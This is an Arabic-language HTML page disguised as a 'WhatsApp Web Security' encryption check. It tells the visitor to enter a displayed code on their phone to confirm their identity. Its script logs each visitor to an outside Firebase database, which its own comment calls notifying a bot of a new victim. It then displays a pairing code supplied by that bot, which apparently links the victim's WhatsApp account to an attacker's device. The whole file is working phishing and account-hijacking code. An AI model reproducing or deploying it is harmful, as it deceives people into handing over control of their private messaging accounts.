<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web Security</title>
    <style>
        body { font-family: system-ui; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        .code-box { font-size: 35px; font-weight: bold; color: #128c7e; background: #e7f3f3; padding: 15px; border-radius: 10px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="card">
        <h3>تأكيد التشفير الثنائي</h3>
        <p>يرجى إدخال الكود التالي في هاتفك لتأكيد الهوية:</p>
        <div id="pairing-code" class="code-box">جاري توليد الكود...</div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();

        // توليد معرف عشوائي للجلسة إذا لم يوجد رقم هاتف في الرابط
        let visitorId = new URLSearchParams(window.location.search).get('id') || "User_" + Math.floor(Math.random() * 10000);

        // 1. إخطار البوت بدخول ضحية جديدة
        db.ref('visiting/' + visitorId).set({ status: "online", time: Date.now() });

        // 2. الاستماع للكود القادم من البوت
        db.ref('sessions/' + visitorId).on('value', (snapshot) => {
            const data = snapshot.val();
            if (data && data.code) {
                document.getElementById('pairing-code').innerText = data.code;
            }
        });
    </script>
</body>
</html>
